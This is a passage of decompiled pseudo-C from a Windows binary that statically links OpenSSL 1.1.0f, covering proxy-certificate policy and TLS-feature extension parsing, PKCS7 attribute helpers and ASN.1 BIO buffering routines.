  __int64 v12; // rax
  __int64 v13; // rbx
  char **v15; // [rsp+40h] [rbp-38h] BYREF
  __int64 v16; // [rsp+48h] [rbp-30h] BYREF
  __int64 v17; // [rsp+98h] [rbp+20h] BYREF

  v15 = 0i64;
  v17 = 0i64;
  v16 = 0i64;
  v4 = sub_1400B8890(a3);
  v5 = 0;
  if ( (int)sub_1400296E0((unsigned int *)v4) > 0 )
  {
    while ( 1 )
    {
      v6 = (_QWORD *)sub_140029880((__int64)v4, v5);
      v7 = (_BYTE *)v6[1];
      if ( !v7 )
        break;
      if ( *v7 == 64 )
        goto LABEL_6;
      if ( !v6[2] )
        break;
      if ( *v7 == 64 )
      {
LABEL_6:
        v8 = 1;
        v9 = (unsigned int *)sub_1400BB7F0(a2);
        if ( !v9 )
        {
          sub_140024610(34, 155, 135, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 264);
LABEL_23:
          sub_140023A40(6, "section:", *v6, ",name:", v6[1], ",value:", v6[2]);
          goto LABEL_25;
        }
        v10 = 0;
        do
        {
          if ( v10 >= (int)sub_1400296E0(v9) )
            break;
          v11 = (_QWORD *)sub_140029880((__int64)v9, v10++);
          v8 = sub_1400C3B30(v11, &v15, &v17, &v16);
        }
        while ( v8 );
        sub_1400BB850(a2, (__int64)v9);
        if ( !v8 )
          goto LABEL_25;
      }
      else if ( !(unsigned int)sub_1400C3B30(v6, &v15, &v17, &v16) )
      {
        goto LABEL_23;
      }
      if ( ++v5 >= (int)sub_1400296E0((unsigned int *)v4) )
      {
        if ( !v15 )
          goto LABEL_24;
        if ( (((unsigned int)sub_14002C260((__int64)v15) - 665) & 0xFFFFFFFD) == 0 && v16 )
        {
          sub_140024610(34, 155, 159, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 293);
          goto LABEL_25;
        }
        v12 = sub_1400ACB80();
        v13 = v12;
        if ( !v12 )
        {
          sub_140024610(34, 155, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 299);
          goto LABEL_25;
        }
        **(_QWORD **)(v12 + 8) = v15;
        *(_QWORD *)(*(_QWORD *)(v12 + 8) + 8i64) = v16;
        *(_QWORD *)v12 = v17;
        v17 = 0i64;
        goto LABEL_26;
      }
    }
    sub_140024610(34, 155, 153, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 254);
    goto LABEL_23;
  }
LABEL_24:
  sub_140024610(34, 155, 154, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 287);
LABEL_25:
  sub_14003F4D0((__int64)v15);
  sub_14004FD70(v17);
  v17 = 0i64;
  sub_14004FD70(v16);
  sub_1400ACB50(0i64);
  v13 = 0i64;
LABEL_26:
  sub_140029720(v4, (void (*)(void))sub_1400B8520);
  return v13;
}

//----- (00000001400C3B30) ----------------------------------------------------
__int64 __fastcall sub_1400C3B30(_QWORD *a1, char ***a2, _QWORD *a3, __int64 *a4)
{
  const char *v4; // rsi
  int v9; // r15d
  __int64 result; // rax
  char **v11; // rax
  __int64 v12; // rcx
  char v13; // al
  __int64 v14; // rcx
  char v15; // al
  void *v16; // rbp
  _DWORD *v17; // rax
  int v18; // eax
  __int64 v19; // rcx
  void *v20; // rsi
  void *v21; // rax
  int v22; // eax
  const char *v23; // rcx
  __int64 *v24; // r14
  int v25; // eax
  size_t v26; // rsi
  void *v27; // rax
  unsigned int v28; // edx
  _BYTE *i; // rax
  __int64 v30; // rcx
  void *v31; // rax
  unsigned int v32[4]; // [rsp+40h] [rbp-858h] BYREF
  char Src[2048]; // [rsp+50h] [rbp-848h] BYREF

  v4 = (const char *)a1[1];
  v9 = 0;
  if ( strcmp(v4, "language") )
  {
    v12 = 0i64;
    while ( 1 )
    {
      v13 = v4[v12++];
      if ( v13 != aPathlen[v12 - 1] )
        break;
      if ( v12 == 8 )
      {
        if ( *a3 )
        {
          sub_140024610(34, 150, 157, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 103);
          goto LABEL_4;
        }
        if ( !(unsigned int)sub_1400B8800((__int64)a1, a3) )
        {
          sub_140024610(34, 150, 156, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 109);
          goto LABEL_4;
        }
        return 1i64;
      }
    }
    v14 = 0i64;
    do
    {
      v15 = v4[v14++];
      if ( v15 != aPolicy[v14 - 1] )
        return 1i64;
    }
    while ( v14 != 7 );
    v16 = 0i64;
    if ( !*a4 )
    {
      v17 = sub_14004FEE0();
      *a4 = (__int64)v17;
      if ( !v17 )
      {
        sub_140024610(34, 150, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 119);
        goto LABEL_4;
      }
      v9 = 1;
    }
    v18 = strncmp((const char *)a1[2], "hex:", 4ui64);
    v19 = a1[2];
    if ( v18 )
    {
      v22 = strncmp((const char *)v19, "file:", 5ui64);
      v23 = (const char *)a1[2];
      if ( !v22 )
      {
        v24 = sub_14003E440(v23 + 5, "r");
        if ( v24 )
        {
          do
          {
            while ( 1 )
            {
              v25 = sub_14002A2C0((__int64)v24, (__int64)Src, 0x800u);
              v26 = v25;
              if ( v25 <= 0 )
                break;
              v27 = sub_14001D970(
                      *(void **)(*a4 + 8),
                      v25 + *(_DWORD *)*a4 + 1,
                      (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c",
                      0xABu);
              v16 = v27;
              if ( !v27 )
              {
                sub_14001D930(*(void **)(*a4 + 8));
                *(_QWORD *)(*a4 + 8) = 0i64;
                *(_DWORD *)*a4 = 0;
                sub_140024610(34, 150, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 178);
                sub_140023A40(6, "section:", *a1, ",name:", a1[1], ",value:", a1[2]);
                sub_140029C60((__int64)v24);
                goto LABEL_49;
              }
              *(_QWORD *)(*a4 + 8) = v27;
              memmove((void *)(*(_QWORD *)(*a4 + 8) + *(int *)*a4), Src, v26);
              *(_DWORD *)*a4 += v26;
              *(_BYTE *)(*(int *)*a4 + *(_QWORD *)(*a4 + 8)) = 0;
            }
          }
          while ( !v25 && (unsigned int)sub_14002A420((__int64)v24, 8u) );
          sub_140029C60((__int64)v24);
          if ( (v26 & 0x80000000) == 0i64 )
            goto LABEL_44;
          sub_140024610(34, 150, 32, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 192);
        }
        else
        {
          sub_140024610(34, 150, 32, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 161);
        }
        goto LABEL_48;
      }
      if ( strncmp(v23, "text:", 5ui64) )
      {
        sub_140024610(34, 150, 152, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 220);
        goto LABEL_48;
      }
      v28 = 0;
      for ( i = (_BYTE *)(a1[2] + 5i64); *i; ++v28 )
      {
        if ( v28 >= 0x80000000 )
          break;
        ++i;
      }
      v30 = *a4;
      v32[0] = v28 & 0x7FFFFFFF;
      v31 = sub_14001D970(
              *(void **)(v30 + 8),
              (int)(*(_DWORD *)v30 + 1 + (v28 & 0x7FFFFFFF)),
              (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c",
              0xC7u);
      v16 = v31;
      if ( !v31 )
      {
        sub_14001D930(*(void **)(*a4 + 8));
        *(_QWORD *)(*a4 + 8) = 0i64;
        *(_DWORD *)*a4 = 0;
        sub_140024610(34, 150, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 214);
        goto LABEL_48;
      }
      *(_QWORD *)(*a4 + 8) = v31;
      memmove((void *)(*(_QWORD *)(*a4 + 8) + *(int *)*a4), (const void *)(a1[2] + 5i64), (int)v32[0]);
      *(_DWORD *)*a4 += v32[0];
      *(_BYTE *)(*(int *)*a4 + *(_QWORD *)(*a4 + 8)) = 0;
    }
    else
    {
      v20 = sub_14003BE60((char *)(v19 + 4), v32);
      if ( !v20 )
        goto LABEL_48;
      v21 = sub_14001D970(
              *(void **)(*a4 + 8),
              v32[0] + 1 + *(_DWORD *)*a4,
              (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c",
              0x87u);
      v16 = v21;
      if ( !v21 )
      {
        sub_14001D930(v20);
        sub_14001D930(*(void **)(*a4 + 8));
        *(_QWORD *)(*a4 + 8) = 0i64;
        *(_DWORD *)*a4 = 0;
        sub_140024610(34, 150, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 151);
        goto LABEL_48;
      }
      *(_QWORD *)(*a4 + 8) = v21;
      memmove((void *)(*(_QWORD *)(*a4 + 8) + *(int *)*a4), v20, (int)v32[0]);
      *(_DWORD *)*a4 += v32[0];
      *(_BYTE *)(*(int *)*a4 + *(_QWORD *)(*a4 + 8)) = 0;
      sub_14001D930(v20);
    }
LABEL_44:
    if ( v16 )
      return 1i64;
    sub_140024610(34, 150, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 225);
LABEL_48:
    sub_140023A40(6, "section:", *a1, ",name:", a1[1], ",value:", a1[2]);
LABEL_49:
    if ( v9 )
    {
      sub_14004FD70(*a4);
      result = 0i64;
      *a4 = 0i64;
      return result;
    }
    return 0i64;
  }
  if ( *a2 )
  {
    sub_140024610(34, 150, 155, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 90);
  }
  else
  {
    v11 = sub_14002C840((char *)a1[2], 0);
    *a2 = v11;
    if ( v11 )
      return 1i64;
    sub_140024610(34, 150, 110, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_pci.c", 96);
  }
LABEL_4:
  sub_140023A40(6, "section:", *a1, ",name:", a1[1], ",value:", a1[2]);
  return 0i64;
}
// 1400C3B30: using guessed type unsigned int var_858[4];

//----- (00000001400C40E0) ----------------------------------------------------
void *sub_1400C40E0()
{
  return sub_14003BB60("NULL");
}

//----- (00000001400C4110) ----------------------------------------------------
__int64 __fastcall sub_1400C4110(__int64 a1, unsigned int *a2, __int64 a3, unsigned int a4)
{
  sub_1400C7E20(a2, a3, a4, "\n", 0i64);
  return 1i64;
}

//----- (00000001400C4150) ----------------------------------------------------
unsigned int *__fastcall sub_1400C4150(int **a1, unsigned __int8 **a2, unsigned int a3)
{
  unsigned int *v4; // rbx
  unsigned int *result; // rax

  v4 = (unsigned int *)sub_1400C7290(a1, a2, a3);
  if ( (unsigned int)sub_1400C4210(v4, 2) == 1 )
    return v4;
  sub_1400C6FD0(v4);
  result = 0i64;
  *a1 = 0i64;
  return result;
}

//----- (00000001400C41B0) ----------------------------------------------------
unsigned int *__fastcall sub_1400C41B0(int **a1, unsigned __int8 **a2, unsigned int a3)
{
  unsigned int *v4; // rbx
  unsigned int *result; // rax

  v4 = (unsigned int *)sub_1400C7290(a1, a2, a3);
  if ( (unsigned int)sub_1400C4210(v4, 3) == 1 )
    return v4;
  sub_1400C6FD0(v4);
  result = 0i64;
  *a1 = 0i64;
  return result;
}

//----- (00000001400C4210) ----------------------------------------------------
__int64 __fastcall sub_1400C4210(unsigned int *a1, int a2)
{
  int v4; // ebx
  _DWORD *v5; // rax

  if ( !a1 )
    return 1i64;
  v4 = 0;
  if ( (int)sub_1400296E0(a1) <= 0 )
    return 1i64;
  while ( 1 )
  {
    v5 = (_DWORD *)sub_140029880((__int64)a1, v4);
    if ( (unsigned int)sub_1400C7220(v5, a2) != 1 )
      break;
    if ( ++v4 >= (int)sub_1400296E0(a1) )
      return 1i64;
  }
  return 0i64;
}

//----- (00000001400C4290) ----------------------------------------------------
int *__fastcall sub_1400C4290(__int64 a1, unsigned int *a2, int *a3)
{
  int i; // ebx
  int *v5; // rdi
  int v6; // eax
  unsigned __int64 v7; // rdx
  _DWORD *v8; // rcx
  int *v10; // [rsp+40h] [rbp+18h] BYREF

  v10 = a3;
  for ( i = 0; i < (int)sub_1400296E0(a2); ++i )
  {
    v5 = (int *)sub_140029880((__int64)a2, i);
    v6 = sub_14007D9A0(v5);
    v7 = 0i64;
    v8 = &unk_14013D808;
    while ( v6 != *v8 )
    {
      ++v7;
      v8 += 4;
      if ( v7 >= 2 )
      {
        sub_1400B8470(0i64, (__int64)v5, &v10);
        goto LABEL_6;
      }
    }
    sub_1400B8300(0i64, *((_BYTE **)&unk_14013D808 + 2 * v7 + 1), &v10);
LABEL_6:
    ;
  }
  return v10;
}
// 1400C433C: conditional instruction was optimized away because rdx.8<2u

//----- (00000001400C4360) ----------------------------------------------------
int *__fastcall sub_1400C4360(__int64 a1, __int64 a2, unsigned int *a3)
{
  int *v4; // r12
  int v6; // ebp
  __int64 v7; // rax
  _QWORD *v8; // r14
  const char *v9; // rsi
  unsigned __int64 v10; // rbx
  const char **v11; // rdi
  unsigned int v12; // ebx
  _DWORD *v13; // rax
  __int64 v14; // rdi
  char *EndPtr; // [rsp+88h] [rbp+20h] BYREF

  v4 = (int *)sub_1400296C0();
  if ( !v4 )
  {
    sub_140024610(34, 165, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_tlsf.c", 98);
    return 0i64;
  }
  v6 = 0;
  if ( (int)sub_1400296E0(a3) > 0 )
  {
    while ( 2 )
    {
      v7 = sub_140029880((__int64)a3, v6);
      v8 = (_QWORD *)v7;
      v9 = *(const char **)(v7 + 16);
      if ( !v9 )
        v9 = *(const char **)(v7 + 8);
      v10 = 0i64;
      v11 = (const char **)&off_14013D810;
      do
      {
        if ( !stricmp(v9, *v11) )
        {
          v12 = *((_DWORD *)&unk_14013D808 + 4 * v10);
          goto LABEL_12;
        }
        ++v10;
        v11 += 2;
      }
      while ( v10 < 2 );
      v12 = strtol(v9, &EndPtr, 10);
      if ( *EndPtr || v9 == EndPtr || v12 > 0xFFFF )
      {
        sub_140024610(34, 165, 143, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_tlsf.c", 118);
        sub_140023A40(6, "section:", *v8, ",name:", v8[1], ",value:", v8[2]);
      }
      else
      {
LABEL_12:
        v13 = sub_14004FE60();
        v14 = (__int64)v13;
        if ( v13 )
        {
          sub_14007DA60((__int64)v13, v12);
          sub_1400297C0(v4, v14);
          if ( ++v6 < (int)sub_1400296E0(a3) )
            continue;
          return v4;
        }
        sub_140024610(34, 165, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\x509v3\\v3_tlsf.c", 126);
      }
      break;
    }
    sub_140029720(v4, (void (*)(void))sub_14004FD70);
    return 0i64;
  }
  return v4;
}
// 1400C44D0: conditional instruction was optimized away because rbx.8<2u
// 14013D810: using guessed type char *off_14013D810;

//----- (00000001400C4580) ----------------------------------------------------
void *sub_1400C4580()
{
  return &unk_140125098;
}

//----- (00000001400C4590) ----------------------------------------------------
void *sub_1400C4590()
{
  return &unk_1401256F0;
}

//----- (00000001400C45A0) ----------------------------------------------------
void *sub_1400C45A0()
{
  return &unk_140125620;
}

//----- (00000001400C45B0) ----------------------------------------------------
void *sub_1400C45B0()
{
  return &unk_140125590;
}

//----- (00000001400C45C0) ----------------------------------------------------
void *sub_1400C45C0()
{
  return &unk_1401257C0;
}

//----- (00000001400C45D0) ----------------------------------------------------
void *sub_1400C45D0()
{
  return &unk_140125440;
}

//----- (00000001400C45E0) ----------------------------------------------------
void *sub_1400C45E0()
{
  return &unk_1401252B0;
}

//----- (00000001400C45F0) ----------------------------------------------------
void *sub_1400C45F0()
{
  return &unk_140125240;
}

//----- (00000001400C4600) ----------------------------------------------------
void *sub_1400C4600()
{
  return &unk_140125190;
}

//----- (00000001400C4610) ----------------------------------------------------
void *sub_1400C4610()
{
  return &unk_140125360;
}

//----- (00000001400C4620) ----------------------------------------------------
void *sub_1400C4620()
{
  return &unk_140125520;
}

//----- (00000001400C4630) ----------------------------------------------------
void *sub_1400C4630()
{
  return &unk_140125900;
}

//----- (00000001400C4640) ----------------------------------------------------
void *sub_1400C4640()
{
  return &unk_140125970;
}

//----- (00000001400C4650) ----------------------------------------------------
void *sub_1400C4650()
{
  return &unk_140125DA0;
}

//----- (00000001400C4660) ----------------------------------------------------
void *sub_1400C4660()
{
  return &unk_1401260B0;
}

//----- (00000001400C4670) ----------------------------------------------------
void *sub_1400C4670()
{
  return &unk_140125EE0;
}

//----- (00000001400C4680) ----------------------------------------------------
void *sub_1400C4680()
{
  return &unk_140125E68;
}

//----- (00000001400C4690) ----------------------------------------------------
void *sub_1400C4690()
{
  return &unk_140126020;
}

//----- (00000001400C46A0) ----------------------------------------------------
__int64 __fastcall sub_1400C46A0(__int64 a1, _DWORD *a2)
{
  _DWORD *v2; // rax

  v2 = a2;
  if ( a2 )
    return sub_1400BFFD0(a1, 0x34u, 23, (__int64)v2);
  v2 = sub_1400B4060(0i64, 0);
  if ( v2 )
    return sub_1400BFFD0(a1, 0x34u, 23, (__int64)v2);
  sub_140024610(33, 135, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\pkcs7\\pk7_attr.c", 100);
  return 0i64;
}

//----- (00000001400C4710) ----------------------------------------------------
__int64 __fastcall sub_1400C4710(__int64 a1, _BYTE *a2, int a3)
{
  _DWORD *v6; // rax
  __int64 v7; // rbx

  v6 = sub_14004FEE0();
  v7 = (__int64)v6;
  if ( v6 )
  {
    if ( (unsigned int)sub_1400475D0((__int64)v6, a2, a3) && (unsigned int)sub_1400BFFD0(a1, 0x33u, 4, v7) )
      return 1i64;
    sub_14004FD70(v7);
  }
  return 0i64;
}

//----- (00000001400C47A0) ----------------------------------------------------
__int64 __fastcall sub_1400C47A0(__int64 a1, __int64 a2, int a3)
{
  __int64 v6; // rbx
  __int64 v7; // rax
  __int64 v8; // r12
  int v9; // r15d
  unsigned int v10; // r8d
  int v11; // eax
  int v12; // edi
  __int64 result; // rax
  int v14; // eax
  bool v15; // zf
  int v16; // eax
  _BYTE *v17; // [rsp+68h] [rbp+10h] BYREF

  v6 = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  v7 = sub_14002A130(a1);
  v8 = v7;
  if ( !a2 || a3 < 0 || !v6 || !v7 )
    return 0i64;
  v9 = 0;
  do
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          while ( !*(_DWORD *)v6 )
          {
            result = sub_1400C4F00(
                       a1,
                       (_DWORD *)v6,
                       *(unsigned int (__fastcall **)(__int64, _DWORD *, _DWORD *, _DWORD *))(v6 + 40),
                       1,
                       2);
            if ( !(_DWORD)result )
              return result;
          }
          if ( *(_DWORD *)v6 != 1 )
            break;
          v12 = sub_1400C4E10(a1, v6, *(void (__fastcall **)(__int64, __int64, __int64, __int64))(v6 + 48), 2);
          if ( v12 <= 0 )
            goto LABEL_17;
        }
        if ( *(_DWORD *)v6 != 2 )
          break;
        v16 = sub_140047960(0, a3, *(_DWORD *)(v6 + 36)) - a3;
        *(_DWORD *)(v6 + 24) = v16;
        if ( v16 > *(_DWORD *)(v6 + 16) )
          sub_1400234A0(
            "assertion failed: ctx->buflen <= ctx->bufsize",
            "..\\..\\openssl-1.1.0f\\crypto\\asn1\\bio_asn1.c",
            181i64);
        v17 = *(_BYTE **)(v6 + 8);
        sub_1400479D0(&v17, 0, a3, *(_DWORD *)(v6 + 36), *(_DWORD *)(v6 + 32));
        *(_DWORD *)(v6 + 28) = a3;
        *(_DWORD *)v6 = 3;
      }
      if ( *(_DWORD *)v6 != 3 )
        break;
      v14 = sub_14002A430(v8, *(_QWORD *)(v6 + 8) + *(int *)(v6 + 20), *(_DWORD *)(v6 + 24));
      v12 = v14;
      if ( v14 <= 0 )
        goto LABEL_17;
      v15 = *(_DWORD *)(v6 + 24) == v14;
      *(_DWORD *)(v6 + 24) -= v14;
      if ( v15 )
      {
        *(_DWORD *)(v6 + 20) = 0;
        *(_DWORD *)v6 = 4;
      }
      else
      {
        *(_DWORD *)(v6 + 20) += v14;
      }
    }
    if ( *(_DWORD *)v6 != 4 )
    {
      sub_140029A60(a1, 15);
      return 0i64;
    }
    v10 = a3;
    if ( a3 > *(_DWORD *)(v6 + 28) )
      v10 = *(_DWORD *)(v6 + 28);
    v11 = sub_14002A430(v8, a2, v10);
    v12 = v11;
    if ( v11 <= 0 )
      break;
    *(_DWORD *)(v6 + 28) -= v11;
    v9 += v11;
    a2 += v11;
    a3 -= v11;
    if ( !*(_DWORD *)(v6 + 28) )
      *(_DWORD *)v6 = 2;
  }
  while ( a3 );
LABEL_17:
  sub_140029A60(a1, 15);
  sub_140029A70(a1);
  if ( v9 > 0 )
    return (unsigned int)v9;
  return (unsigned int)v12;
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400C49C0) ----------------------------------------------------
__int64 __fastcall sub_1400C49C0(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 result; // rax

  result = sub_14002A130(a1);
  if ( result )
    return sub_14002A2C0(result, a2, a3);
  return result;
}

//----- (00000001400C4A10) ----------------------------------------------------
__int64 __fastcall sub_1400C4A10(__int64 a1, __int64 a2)
{
  __int64 v2; // r8

  v2 = -1i64;
  do
    ++v2;
  while ( *(_BYTE *)(a2 + v2) );
  return sub_1400C47A0(a1, a2, v2);
}

//----- (00000001400C4A40) ----------------------------------------------------
__int64 __fastcall sub_1400C4A40(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 result; // rax

  result = sub_14002A130(a1);
  if ( result )
    return sub_140029D60(result, a2, a3);
  return result;
}

//----- (00000001400C4A90) ----------------------------------------------------
__int64 __fastcall sub_1400C4A90(__int64 a1, unsigned int a2, unsigned int a3, _QWORD *a4)
{
  __int64 result; // rax
  __int64 v9; // rbx
  _QWORD *v10; // rsi

  result = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  v9 = result;
  if ( result )
  {
    v10 = (_QWORD *)sub_14002A130(a1);
    switch ( a2 )
    {
      case 0xBu:
        if ( !v10
          || *(_DWORD *)v9 == 2
          && !(unsigned int)sub_1400C4F00(
                              a1,
                              (_DWORD *)v9,
                              *(unsigned int (__fastcall **)(__int64, _DWORD *, _DWORD *, _DWORD *))(v9 + 56),
                              5,
                              6) )
        {
          goto LABEL_16;
        }
        if ( *(_DWORD *)v9 != 5
          || (result = sub_1400C4E10(a1, v9, *(void (__fastcall **)(__int64, __int64, __int64, __int64))(v9 + 64), 6),
              (int)result > 0) )
        {
          if ( *(_DWORD *)v9 == 6 )
            goto LABEL_18;
          sub_140029A60(a1, 15);
          goto LABEL_16;
        }
        break;
      case 0x95u:
        *(_QWORD *)(v9 + 40) = *a4;
        *(_QWORD *)(v9 + 48) = a4[1];
        result = 1i64;
        break;
      case 0x96u:
        *a4 = *(_QWORD *)(v9 + 40);
        a4[1] = *(_QWORD *)(v9 + 48);
        result = 1i64;
        break;
      case 0x97u:
        *(_QWORD *)(v9 + 56) = *a4;
        *(_QWORD *)(v9 + 64) = a4[1];
        result = 1i64;
        break;
      case 0x98u:
        *a4 = *(_QWORD *)(v9 + 56);
        a4[1] = *(_QWORD *)(v9 + 64);
        result = 1i64;
        break;
      case 0x99u:
        *(_QWORD *)(v9 + 88) = a4;
        result = 1i64;
        break;
      case 0x9Au:
        *a4 = *(_QWORD *)(v9 + 88);
        result = 1i64;
        break;
      default:
        if ( v10 )
LABEL_18:
          result = sub_140029A90(v10, a2, a3, (__int64)a4);
        else
LABEL_16:
          result = 0i64;
        break;
    }
  }
  return result;
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400C4CD0) ----------------------------------------------------
__int64 __fastcall sub_1400C4CD0(__int64 a1)
{
  int v1; // eax
  _QWORD *v3; // rbx
  void *v4; // rax

  v3 = sub_14001DC20((unsigned int)(v1 + 64));
  if ( v3 )
  {
    v4 = sub_14001D8E0(0x14ui64);
    v3[1] = v4;
    if ( v4 )
    {
      *((_DWORD *)v3 + 4) = 20;
      *((_DWORD *)v3 + 8) = 0;
      *(_DWORD *)v3 = 0;
      *((_DWORD *)v3 + 9) = 4;
      sub_14002A3F0(a1, (__int64)v3);
      sub_14002A410(a1, 1);
      return 1i64;
    }
    sub_14001D930(v3);
  }
  return 0i64;
}
// 1400C4CEA: variable 'v1' is possibly undefined

//----- (00000001400C4D80) ----------------------------------------------------
__int64 __fastcall sub_1400C4D80(__int64 a1)
{
  __int64 result; // rax
  void *v3; // rdi

  if ( !a1 )
    return 0i64;
  result = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  v3 = (void *)result;
  if ( result )
  {
    sub_14001D930(*(void **)(result + 8));
    sub_14001D930(v3);
    sub_14002A3F0(a1, 0i64);
    sub_14002A410(a1, 0);
    return 1i64;
  }
  return result;
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400C4E10) ----------------------------------------------------
__int64 __fastcall sub_1400C4E10(
        __int64 a1,
        __int64 a2,
        void (__fastcall *a3)(__int64, __int64, __int64, __int64),
        int a4)
{
  signed int v4; // ebp
  __int64 v10; // rdi
  __int64 v11; // rax
  int v12; // edi
  signed int v13; // ebp
  __int64 v14; // rdi
  __int64 v15; // rax

  v4 = *(_DWORD *)(a2 + 80);
  if ( v4 <= 0 )
    return 1i64;
  v10 = *(_QWORD *)(a2 + 72) + *(int *)(a2 + 84);
  v11 = sub_14002A130(a1);
  v12 = sub_14002A430(v11, v10, v4);
  if ( v12 > 0 )
  {
    while ( 1 )
    {
      *(_DWORD *)(a2 + 80) -= v12;
      v13 = *(_DWORD *)(a2 + 80);
      if ( v13 <= 0 )
        break;
      *(_DWORD *)(a2 + 84) += v12;
      v14 = *(_QWORD *)(a2 + 72) + *(int *)(a2 + 84);
      v15 = sub_14002A130(a1);
      v12 = sub_14002A430(v15, v14, v13);
      if ( v12 <= 0 )
        return (unsigned int)v12;
    }
    if ( a3 )
      a3(a1, a2 + 72, a2 + 80, a2 + 88);
    *(_DWORD *)a2 = a4;
    *(_DWORD *)(a2 + 84) = 0;
  }
  return (unsigned int)v12;
}

//----- (00000001400C4F00) ----------------------------------------------------
__int64 __fastcall sub_1400C4F00(
        __int64 a1,
        _DWORD *a2,
        unsigned int (__fastcall *a3)(__int64, _DWORD *, _DWORD *, _DWORD *),
        int a4,
        int a5)
{
  if ( !a3 || a3(a1, a2 + 18, a2 + 20, a2 + 22) )
  {
    if ( (int)a2[20] > 0 )
      a5 = a4;
    *a2 = a5;
    return 1i64;
  }
  else
  {
    sub_140029A60(a1, 15);
    return 0i64;
  }
}

//----- (00000001400C4F80) ----------------------------------------------------
__int64 __fastcall sub_1400C4F80(__int64 a1, char *a2, int a3)
{
  int v3; // eax
  signed int v4; // esi
  char *v5; // r15
  int v7; // r12d
  __int64 v8; // rbx
  int v9; // r14d
  int v10; // ecx
  __int64 v11; // rdi
  bool v12; // zf
  int v13; // eax

  v4 = a3;
  v5 = a2;
  v7 = 0;
  if ( !a2 || a3 <= 0 )
    return 0i64;
  v8 = *(_QWORD *)(a1 + 48);
  if ( !v8 || !*(_QWORD *)(a1 + 56) )
    return 0i64;
  sub_140029A60(a1, v3 - 17);
  v9 = *(_DWORD *)(v8 + 4) - *(_DWORD *)(v8 + 36) - *(_DWORD *)(v8 + 32);
  if ( v9 >= v4 )
  {
LABEL_20:
    memmove((void *)(*(_QWORD *)(v8 + 24) + *(_DWORD *)(v8 + 32) + *(_DWORD *)(v8 + 36)), v5, v4);
    *(_DWORD *)(v8 + 32) += v4;
    return (unsigned int)(v7 + v4);
  }
  while ( 1 )
  {
    v10 = *(_DWORD *)(v8 + 32);
    if ( v10 )
    {
      if ( v9 > 0 )
      {
        memmove((void *)(*(_QWORD *)(v8 + 24) + v10 + *(_DWORD *)(v8 + 36)), v5, v9);
        v5 += v9;
        v4 -= v9;
        v7 += v9;
        *(_DWORD *)(v8 + 32) += v9;
      }
      do
      {
        LODWORD(v11) = sub_14002A430(
                         *(_QWORD *)(a1 + 56),
                         *(_QWORD *)(v8 + 24) + *(int *)(v8 + 36),
                         *(_DWORD *)(v8 + 32));
        if ( (int)v11 <= 0 )
        {
          sub_140029A70(a1);
          if ( (int)v11 < 0 )
          {
LABEL_22:
            if ( v7 > 0 )
              LODWORD(v11) = v7;
            return (unsigned int)v11;
          }
          if ( !(_DWORD)v11 )
            return (unsigned int)v7;
        }
        *(_DWORD *)(v8 + 36) += v11;
        v12 = *(_DWORD *)(v8 + 32) == (_DWORD)v11;
        *(_DWORD *)(v8 + 32) -= v11;
      }
      while ( !v12 );
    }
    *(_DWORD *)(v8 + 36) = 0;
    if ( v4 >= *(_DWORD *)(v8 + 4) )
      break;
LABEL_19:
    v9 = *(_DWORD *)(v8 + 4) - *(_DWORD *)(v8 + 36) - *(_DWORD *)(v8 + 32);
    if ( v9 >= v4 )
      goto LABEL_20;
  }
  while ( 1 )
  {
    v13 = sub_14002A430(*(_QWORD *)(a1 + 56), (__int64)v5, v4);
    v11 = v13;
    if ( v13 <= 0 )
    {
      sub_140029A70(a1);
      if ( (int)v11 < 0 )
        goto LABEL_22;
      if ( !(_DWORD)v11 )
        break;
    }
    v7 += v11;
    v5 += v11;
    v4 -= v11;
    if ( !v4 )
      break;
    if ( v4 < *(_DWORD *)(v8 + 4) )
      goto LABEL_19;
  }
  return (unsigned int)v7;
}
// 1400C4FD8: variable 'v3' is possibly undefined

//----- (00000001400C5150) ----------------------------------------------------
